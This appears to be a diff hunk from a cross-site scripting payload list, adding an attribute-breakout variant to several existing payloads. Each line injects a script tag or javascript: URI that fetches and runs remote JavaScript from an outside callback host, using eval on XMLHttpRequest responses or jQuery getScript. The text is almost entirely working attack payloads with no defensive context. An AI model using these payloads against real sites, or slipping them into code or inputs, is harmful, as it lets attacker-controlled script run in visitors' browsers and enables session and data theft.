@@ -13,3 +13,4 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://artori
 <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//artorias.xss.ht");a.send();</script>
 
 <script>$.getScript("//artorias.xss.ht")</script>
+"><script>$.getScript("//artorias.xss.ht")</script>
